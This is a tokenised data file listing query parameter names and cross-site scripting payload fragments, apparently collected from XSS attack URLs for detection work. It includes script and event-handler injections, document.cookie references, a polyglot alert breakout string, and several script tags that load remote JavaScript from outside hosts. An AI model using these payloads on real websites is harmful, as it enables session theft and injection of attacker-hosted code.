,tokens
0,k=
1,n=
2,http://u
3,>
4,</script>
5,)
6,alert(
7,<script>
8,b0=
9,document.cookie
10,precio=
11,login=
12,nombre=
13,0
14,<h0>
15,</h0>
16,"""maxwel"""
17,<marquee>
18,</marquee>
19,email=
20,password=
21,provincia=
22,cp=
23,ntc=
24,ciudad=
25,direccion=
26,apellidos=
27,dni=
28,pwd=
29,remember=
30,cantidad=
31,</title>
32,string.fromcharcode(
33,y=
34,'xss'
35,x=
36,"""backdoor"""
37,<script/src=http://kusomiso.com/xss.js>
38,id=
39,http://www
40,"""xss"""
41,/xss/
42,user_rating=
43,submit_vote=
44,url=
45,"<script 
>"
46,submit=
47,page=
48,</a>
49,</iframe>
50,<br>
51,q=
52,"0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)"
53,search=
54,cid=
55,keyword=
56,lang=
57,itemid=
58,"<iframe src=""http://xssed.com"">"
59,src=
60,type=
61,task=
62,pop=
63,query=
64,"0,0,0))//';alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0)"
65,a=
66,b=
67,option=
68,http://xssed
69,a(
70,b(
71,"0,0,0)"
72,/xssed/
73,cat=
74,<script src=http://vuln.xssed.net/thirdparty/scripts/python0.js>
75,</style>
76,/xss/.source)
77,strkey=
78,name=
79,</textarea>
80,s=
81,title=
82,"""scriptorium(turkey)"""
83,ortak=
84,<body onload=alert(0)>
85,<p
86,p=
87,from=
88,mode=
89,<iframe src=http://google.com>
90,year=
91,<script src=http://vuln.xssed.net/thirdparty/scripts/hotpockets.js>
92,"""bluemax"""
93,action=
94,<script/src=http://kusomiso.com/x.js>
95,/ar0sw0rmed/
96,<iframe
97,category=
98,javascript:
99,<iframe src=javascript:alert(0)>
100,http://kusomiso
101,'trex'
102,keywords=
103,onmouseover=
104,<iframe src=http://www.google.de>
105,sort=
106,"<marquee bgcolor=""red"">"
107,'xssed'
108,"<""<<script>"
109,"""cyber"""
110,backdoor
111,"""scriptorium(turkey)hackhaber.com"""
112,onerror=
113,site=
114,http://localhost
115,tag=
116,'x'
117,setday=
118,start=
119,"0,0,0,0,0,0,0,0,0,0,0,0))//';alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0))//"";alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0))//"";alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0)"
120,<script
121,setdate=
122,t=
123,</font>
124,</marque>
125,<iframe src=http://xssed.com>
126,ref=
127,<!--
128,"0,0,0,0,0,0,0,0,0,0,0,0)"
129,c=
130,no=
131,0:
132,<center>
133,"""document.cookie"""
134,w=
135,"""fugitif"""
136,<script src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.js>
137,location=
138,view=
139,/the-sh0ck-b0y/
140,document.write(
141,type:
142,"<body onload=alert(""by encore"")>"
143,java:
144,l=
145,<script src=http://starext.by.ru/lt.js>
146,language=
147,<iframe onload=alert(/xss/)>
148,searchstring=
149,<img src=k.png onerror=alert(/xss/.source) />
150,form=
151,m=
152,pid=
153,/www.r0t.n0t.nl/
154,</div>
155,lid=
156,<</script>
157,recpag=
158,sid=
159,http://vuln
160,"<"""
161,results=
162,/xssed_by_omeha/);</script><script>alert(document.cookie
163,search_type=
164,cyber-unity
165,http://cyber
166,country=
167,searchterm=
168,"""cyber-warrior.org"""
169,words=
170,ie=
171,</center>
172,r=
173,dil=
174,/st@r-gaz0r/
175,'0ssi0-xht'
176,qs=
177,cal=
178,o=
179,'i-landet'
180,key=
181,searchtxt=
182,"""xssed"""
183,submit0=
184,/xss/.source
185,qt=
186,searchtype=
187,'drakula'
188,length:
189,msg=
190,go=
191,<<script>
192,'the_miller'
193,st=
194,<noscript>
195,source=
196,username=
